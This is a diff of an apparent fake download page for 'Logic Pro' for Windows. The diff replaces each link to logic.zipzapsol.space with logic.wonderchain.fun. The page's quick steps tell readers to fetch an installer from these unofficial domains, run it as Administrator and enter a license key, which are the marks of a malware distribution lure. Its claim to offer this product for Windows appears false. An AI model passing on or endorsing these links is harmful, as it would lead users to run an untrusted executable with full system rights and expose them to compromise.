@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Logic Pro** for Windows.
 
 <p align="center">
-  <a href="https://logic.zipzapsol.space/">
+  <a href="https://logic.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Logic%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Logic Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[logic.zipzapsol.space](https://logic.zipzapsol.space/)** |
-| **Full URL** | `https://logic.zipzapsol.space/` |
+| **Direct link** | **[logic.wonderchain.fun](https://logic.wonderchain.fun/)** |
+| **Full URL** | `https://logic.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — logic.zipzapsol.space](https://logic.zipzapsol.space/)** (link above)
+1. Click **[Download — logic.wonderchain.fun](https://logic.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://logic.zipzapsol.space/"><strong>⬇ Download Logic Pro now</strong></a></p>
+<p align="center"><a href="https://logic.wonderchain.fun/"><strong>⬇ Download Logic Pro now</strong></a></p>
 
 ---
 
